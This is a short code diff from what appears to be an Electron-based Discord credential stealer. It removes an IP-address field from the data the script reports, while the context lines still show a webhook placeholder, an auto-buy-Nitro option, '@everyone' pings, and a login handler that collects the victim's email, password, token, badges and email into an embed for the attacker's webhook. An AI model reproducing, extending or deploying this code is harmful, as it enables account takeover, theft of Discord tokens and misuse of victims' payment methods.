@@ -7,7 +7,6 @@ const { BrowserWindow, session } = require("electron");
 
 const config = {
   webhook: "%WEBHOOK%",
-  ip: '%IP%',
   auto_buy_nitro: true,
   ping_on_run: false,
   ping_val: "@everyone",
@@ -344,11 +343,6 @@ const login = async (email, password, token) => {
                     "name": "<:sn4:989240048157356062> SN - Badges:",
                     "value": `${badges}`,
                     "inline": true
-                },
-                 {
-                    name: '<a:4386skull2:989349541876731904> SN - IP:',
-                    value: `\`${config.ip}\``,
-                    inline: true,
                 },
                 {
                     "name": "<a:sn2:989239408400138310> SN - Email:",
